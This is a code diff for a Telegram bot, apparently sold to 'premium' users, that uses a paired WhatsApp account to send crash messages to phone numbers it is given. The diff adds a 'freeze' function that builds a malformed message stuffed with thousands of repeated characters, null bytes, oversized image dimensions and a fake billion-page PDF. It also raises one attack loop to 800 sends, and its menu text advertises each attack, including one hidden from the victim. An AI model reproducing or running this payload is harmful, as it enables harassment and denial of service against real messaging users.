@@ -635,7 +635,7 @@ bot.command("connect", async (ctx) => {
       const code = await kipop.requestPairingCode(phoneNumber);
       const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
 
-      await ctx.replyWithPhoto("https://files.catbox.moe/kzk3dp.jpg", {
+      await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
           caption: `
 ╭──「  𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘  」 
 ┃ 𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
@@ -1174,11 +1174,11 @@ const prosesrespone = async (target, ctx) => {
 ┃│ Target Nomor : wa.me/${target.split("@") [0]}
 ┃╰────────────────────
 ┗━━━━━━━━━━━━━━━━━━━━━━━❍
-Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
+Sudah Bug Tolong Jeda 10 Menitan, Biar Sender Bug Tidak Kenon.
  `;
 
   try {
-      await ctx.replyWithPhoto("https://files.catbox.moe/fo6ov1.jpg", {
+      await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
           caption: caption,
           parse_mode: "Markdown"
       });
@@ -1207,10 +1207,10 @@ const donerespone = async (target, ctx) => {
 ┃│ Target Nomor : wa.me/${target.split("@") [0]}
 ┃╰────────────────────
 ┗━━━━━━━━━━━━━━━━━━━━━━━❍
-Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
+Sudah Bug Tolong Jeda 10 Menitan, Biar Sender Bug Tidak Kenon.
 `;
  
-    await ctx.replyWithPhoto("https://files.catbox.moe/fo6ov1.jpg", {
+    await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
         caption: caption,
         parse_mode: "Markdown",
         reply_markup: {
@@ -1230,7 +1230,7 @@ Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
 ┃│ Target Nomor : wa.me/${target.split("@") [0]}
 ┃╰────────────────────
 ┗━━━━━━━━━━━━━━━━━━━━━━━❍
-Sudah Bug Tolong Jeda 5-10 Menitan, Biar Sender Bug Tidak Kenon.
+Sudah Bug Tolong Jeda 10 Menitan, Biar Sender Bug Tidak Kenon.
 `; 
  
       await ctx.reply(fallbackCaption, {
@@ -1307,7 +1307,7 @@ bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => 
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 200; i++) {
+  for (let i = 0; i < 800; i++) {
         await protocolbug2(target, true)
         await sleep(3000)
     
@@ -1316,7 +1316,7 @@ bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => 
   await donerespone(target, ctx);
 });
 
-bot.command("delayresponse", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("fz", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1327,8 +1327,8 @@ bot.command("delayresponse", checkWhatsAppConnection, checkPremium, async ctx =>
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 300; i++) {
-        await InVisibleX1(target, true);
+  for (let i = 0; i < 5; i++) {
+        await freeze(target, true);
     
 }
 
@@ -1346,7 +1346,7 @@ bot.command("forcestatus", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 300; i++) {
+  for (let i = 0; i < 10; i++) {
     await protocolbug3(target, true)
     await sleep(3000)
     
@@ -1406,45 +1406,26 @@ bot.start(async (ctx) => {
 //Runtime Module
     const waktuRunPanel = getUptime(); // Waktu uptime panel
         
-  const mainMenuMessage = `\`\`\`
-╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
-║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
-┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
-║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
-╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
-╭━━━━━━━━━━━━━━━━━━━━━
-┃𝙾𝚆𝙽𝙴𝚁 𝙾𝙽𝙴 >> t.me/kipopLecy
-┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚆𝙾 >> t.me/kurozi21
-┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚁𝙴𝙴 >> t.me/Zyrexoffc
-┃𝙾𝚆𝙽𝙴𝚁 𝙵𝙾𝚁𝚁 >> t.me/Osaka_Real
-╰━━━━━━━━━━━━━━━━━━━━━
+  const mainMenuMessage = `╭━━━『 R A N Z ✦ C R A S H E R S 』━━━━
+│
+│➼ 𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : RanzBOT
+│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
+│➼ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
+│
+╰━━━━━━━━━━━
+『 𝘾𝙇𝙄𝘾𝙆 𝘽𝙐𝙏𝙏𝙊𝙉 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄 』
 
-╭────────────────────
-│[ 𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙴𝙽𝚄 ]
-╰────────────────────
-\`\`\``;
+- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
 
 const mainKeyboard = [
     [{
-      text: "『 𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』", 
-      callback_data: "owner_menu"
-    }, 
-    {
-      text: "『 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』",
+      text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
       callback_data: "bug_menu"
-    }], 
-    [{
-      text: "[+ 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 +]", 
-      url: "https://t.me/kipopLecy"
-    }, 
-    {
-      text: "[+ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 +]", 
-      url: "https://t.me/traz_Invictus"
     }]
   ];
 
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/zrq1px.jpg", {
+    await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
       caption: mainMenuMessage,
       parse_mode: "Markdown",
       reply_markup: {
@@ -1455,7 +1436,7 @@ const mainKeyboard = [
 });
 
 // Handler untuk callback "owner_management"
-bot.action('owner_menu', async (ctx) => {
+bot.action('ownerjsjjs_menu', async (ctx) => {
   await ctx.deleteMessage();
   const isPremium = isPremiumUser(ctx.from.id);
   const isAdminStatus = isAdmin(ctx.from.id);
@@ -1501,7 +1482,7 @@ bot.action('owner_menu', async (ctx) => {
     });
 });
 
-bot.action('admin_menu', async (ctx) => {
+bot.action('admin_menjxjjxu', async (ctx) => {
   await ctx.deleteMessage();
   const isPremium = isPremiumUser(ctx.from.id);
   const isAdminStatus = isAdmin(ctx.from.id);
@@ -1549,32 +1530,35 @@ bot.action('bug_menu', async (ctx) => {
 //Runtime Module
     const waktuRunPanel = getUptime(); // Waktu uptime panel
     
-  const mainMenuMessage = `\`\`\`  
-╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
-║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
-┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
-║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
-╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
-  
-┏━━『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』
-╿☐ ⧽ /ᴅᴇʟᴀʏɪɴᴠɪs × ɴᴏ
-╽☐ ⧽ /ᴅᴇʟᴀʏᴍᴇɴᴛɪᴏɴ × ɴᴏ
-╽☐ ⧽ /ᴅᴇʟᴀʏʀᴇsᴘᴏɴsᴇ × ɴᴏ
-╿☐ ⧽ /ғᴏʀᴄᴇᴄʟᴏsᴇ × ɴᴏ
-╽☐ ⧽ /ғᴏʀᴄᴇsᴛᴀᴛᴜs  × ɴᴏ
-╿☐ ⧽ /ᴄᴏᴍʙᴏғᴏʀᴄᴇ × ɴᴏ
-┕━━━━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``;
+  const mainMenuMessage = `Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
+            
+ 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕
+──────────────────────────
+#- RanzDelayMention
+▢ /delaymention 628xxx
+╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir
+
+#- RanzBugForceClose
+▢ /forceclose 628xxx
+╰➤ Bug ini akan melakukan spam bug kepada target setiap kali bug masuk maka target akan force close (keluar dari wa) kekurangan bug ini target dapat melihat nomor bot yg mengirimkan bug dan bisa saja diblokir 
+
+#- RanzBugFrezechat
+▢ /frezechat 628xxx
+╰➤ Bug ini sama seperti delaymention bedanya bug ini melakukan bug langsung kepada target, berbeda dengan delaymention yg melakukan bug melalui sw. target akan ditag di sw bug tersebut 
+
+#- RanzBugIOS
+▢ /bakios 628xxx
+╰➤ Bug ini adalah Bug iPhone/ios silahkan dites untuk yg ada iphone`;
   
 const mainKeyboard = [
     [{
-      text: "𝙱𝙰𝙲𝙺",
-      callback_data: "back"
+      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
+                      url: "https://t.me/abee1945"
     }]
   ];
 
 
-  await ctx.replyWithPhoto("https://files.catbox.moe/kzk3dp.jpg", {
+  await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
       caption: mainMenuMessage,
       parse_mode: "Markdown",
       reply_markup: {
@@ -1584,7 +1568,7 @@ const mainKeyboard = [
 })
 
 // Handler untuk callback "main_menu"
-bot.action('back', async (ctx) => {
+bot.action('bacghhk', async (ctx) => {
   await ctx.deleteMessage();
   const isPremium = isPremiumUser(ctx.from.id);
   const isAdminStatus = isAdmin(ctx.from.id);
@@ -1592,44 +1576,25 @@ bot.action('back', async (ctx) => {
 //Runtime Module
     const waktuRunPanel = getUptime(); // Waktu uptime panel
  
-  const mainMenuMessage = `\`\`\` 
-╭━𓊈 𝐓𝐑𝐀𝐙 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𓊉━═╣
-║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : 𝚃𝚁𝙰𝚉 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂
-┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟺
-║𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
-╰━━━━━━━━━━━━━━━━━━━━━━━━━═╣
-╭━━━━━━━━━━━━━━━━━━━━━
-┃𝙾𝚆𝙽𝙴𝚁 𝙾𝙽𝙴 >> t.me/kipopLecy
-┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚆𝙾 >> t.me/kurozi21
-┃𝙾𝚆𝙽𝙴𝚁 𝚃𝚁𝙴𝙴 >> t.me/Zyrexoffc
-┃𝙾𝚆𝙽𝙴𝚁 𝙵𝙾𝚁𝚁 >> t.me/Osaka_Real
-╰━━━━━━━━━━━━━━━━━━━━━
+  const mainMenuMessage = `╭━━━『 R A N Z ✦ C R A S H E R S 』━━━━
+│
+│➼ 𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : RanzBOT
+│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
+│➼ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${waktuRunPanel}
+│
+╰━━━━━━━━━━━
+『 𝘾𝙇𝙄𝘾𝙆 𝘽𝙐𝙏𝙏𝙊𝙉 𝘿𝙄 𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄 』
 
-╭────────────────────
-│[ 𝚂𝙴𝙻𝙴𝙲𝚃 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙴𝙽𝚄 ]
-╰────────────────────
-\`\`\``;
+- © 𝐑𝐚𝐧𝐳𝐢𝐬𝐆𝐎𝐎𝐃 ᯤ`;
 
 const mainKeyboard = [
     [{
-      text: "『 𝐎𝐖𝐍𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』", 
-      callback_data: "owner_menu"
-    }, 
-    {
       text: "『 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 』",
       callback_data: "bug_menu"
-    }], 
-    [{
-      text: "[+ 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 +]", 
-      url: "https://t.me/kipopLecy"
-    }, 
-    {
-      text: "[+ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 +]", 
-      url: "https://t.me/traz_Invictus"
     }]
   ];
  
-  await ctx.replyWithPhoto("https://files.catbox.moe/zrq1px.jpg", {
+  await ctx.replyWithPhoto("https://d.uguu.se/EppqczQR.jpg", {
     caption: mainMenuMessage,
     parse_mode: "Markdown",
     reply_markup: {
@@ -1718,6 +1683,71 @@ async function aswFChyui(target) {
   });
 }
 
+async function freeze(target, count) {
+let travas = "ꦽ".repeat(15000)
+    for (let i = 0; i < count; i++) {
+         kipop.relayMessage(target, {
+            viewOnceMessage: {
+                message: {
+                    "interactiveMessage": {
+                        "header": {
+                            "title": "𝘠𝘰𝘶𝘳 𝘊𝘩𝘢𝘵 𝘩𝘢𝘷𝘦 𝘣𝘦𝘦𝘯 𝘧𝘳𝘦𝘦𝘻𝘦𝘥 🥔👁 𝙂𝙕𝘾𝙇𝙄𝙀𝙉𝙏 #𝙑𝙄𝙇𝙇𝙀𝙓𝙀𝘾 (𝚆𝙷𝙰𝚃 𝙷𝙰𝙿𝙿𝙴𝙽 𝚆𝙸𝚃𝙷 𝚈𝙾𝚄 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿?) " + travas,
+                            "hasMediaAttachment": true,
+                            "imageMessage": {
+                                "url": "https://mmg.whatsapp.net/v/t62.7118-24/21391932_1161272905998313_4827991675750411452_n.enc?ccb=11-4&oh=01_Q5AaIGWHQEOBVWT_vIOLOFRS1Nc7RNqVQMTpdDPY02X8-bvS&oe=67C1FF81&_nc_sid=5e03e0&mms3=true",
+                                "mimetype": "image/jpeg",
+                                "fileSha256": "Wnf6QkilVowZ5j2UfTlNNF3LQ8g16qLi3QzYXhiObO0=",
+                                "fileLength": "92017",
+                                "height": 9999,
+                                "width": 9999,
+                                "mediaKey": "+wjoVJDg2Pm/EuVm8RzntXdG26Xep6gZu/Rs2zRL/WI=",
+                                "fileEncSha256": "WwDDQTugpE0UEcNt/dwSNuHUBRKFEuebiSaB6NDAoHE=",
+                                "directPath": "/v/t62.7118-24/21391932_1161272905998313_4827991675750411452_n.enc?ccb=11-4&oh=01_Q5AaIGWHQEOBVWT_vIOLOFRS1Nc7RNqVQMTpdDPY02X8-bvS&oe=67C1FF81&_nc_sid=5e03e0",
+                                "mediaKeyTimestamp": "1738184318"
+                            }
+                        },
+                        "body": {
+                            "text": "𝙸'𝙼 𝙽𝙾𝚃 𝙷𝙰𝚅𝙴 𝙳𝙴𝙰𝙳𝙻𝙸𝙽𝙴 - What happen?" + "\u0000".repeat(8888)
+                        },
+                        "nativeFlowMessage": {
+                            "buttons": [{
+                                "name": "galaxy_message",
+                                "buttonParamsJson": JSON.stringify({
+                                    "header": "Freezing ALWAYS; ",
+                                    "body": "xxx",
+                                    "flow_action": "navigate",
+                                    "flow_action_payload": { screen: "FORM_SCREEN" },
+                                    "flow_cta": '𝘚𝘪𝘮𝘱𝘭𝘦 𝘣𝘶𝘵 𝘤𝘳𝘢𝘴𝘩 𝘹𝘹𝘹𝘹𝘹𝘹𝘹𝘹' + travas + travas,
+                                    "flow_id": "1169834181134583",
+                                    "flow_message_version": "3",
+                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
+                                })
+}]
+                        },
+                        'contextInfo': {
+                            'isForwarded': true,
+                            'fromMe': false,
+                            'participant': '0@s.whatsapp.net',
+                            'remoteJid': target,
+                            'quotedMessage': {
+                                documentMessage: {
+                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
+                                    mimetype: "application/pdf",
+                                    title: "crash",
+                                    pageCount: 1000000000,
+                                    fileName: "#gzclient.pdf",
+                                    contactVcard: true
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }, {});
+    }
+
+    // Mark Zuckberg i gotchu
+}
 
 async function protocolbug2(isTarget, mention) {
     const generateMessage = {
